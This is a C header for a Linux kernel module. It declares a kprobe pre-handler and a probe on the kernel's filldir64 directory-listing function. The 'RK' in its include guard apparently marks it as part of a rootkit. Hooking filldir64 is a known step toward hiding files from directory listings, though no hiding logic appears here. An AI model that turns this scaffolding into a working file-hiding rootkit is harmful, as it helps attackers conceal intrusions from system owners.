/**
 * @file kprobe.h
 * 
 * @brief Definitions for kernel probes
 * 
 * This file contains the definitions for kernel probes. Kernel probes are used
 * to intercept and monitor kernel functions.
 */

#ifndef _RK_KPROBE_H
#define _RK_KPROBE_H

#include <linux/kprobes.h>

/**
 * @brief The pre-handler function for the kprobe
 * 
 * This function is called before the probed function is executed. It is used to
 * handle the kprobe before the probed function is executed.
 * 
 * @param p The kprobe structure
 * @param regs The register structure
 * 
 * @return 0 on success, a negative error code on failure
 */
int __kprobes handler_pre(struct kprobe *p, struct pt_regs *regs);

/**
 * @brief The kprobe structure
 * 
 * This structure defines the kprobe that will be used to intercept the kernel
 * function.
 * 
 * @note Here we are using the filldir64 function as the target for the kprobe.
 */
static struct kprobe kp = 
{
    .symbol_name = "filldir64"
};

#endif // RK_KPROBE_H